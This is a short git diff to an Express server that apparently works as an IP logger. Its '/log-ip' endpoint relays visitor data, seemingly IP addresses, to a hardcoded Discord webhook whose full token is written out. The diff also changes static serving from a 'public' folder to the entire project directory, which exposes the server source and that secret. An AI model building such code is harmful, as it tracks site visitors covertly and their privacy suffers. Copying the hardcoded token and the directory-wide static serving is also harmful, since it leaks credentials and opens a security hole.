@@ -6,7 +6,8 @@ const PORT = process.env.PORT || 3000;
 
 // Middleware
 app.use(express.json());
-app.use(express.static('public')); // Serve your HTML file from 'public' folder
+// Serve files from current directory
+app.use(express.static(__dirname));
 
 // Your Discord webhook URL
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
@@ -68,6 +69,11 @@ app.post('/log-ip', async (req, res) => {
         console.error('Error sending to Discord:', error.message);
         res.status(500).json({ success: false, error: "Failed to log IP" });
     }
+});
+
+// Serve the HTML file when someone visits the root URL
+app.get('/', (req, res) => {
+    res.sendFile(__dirname + '/index.html');
 });
 
 app.listen(PORT, () => {
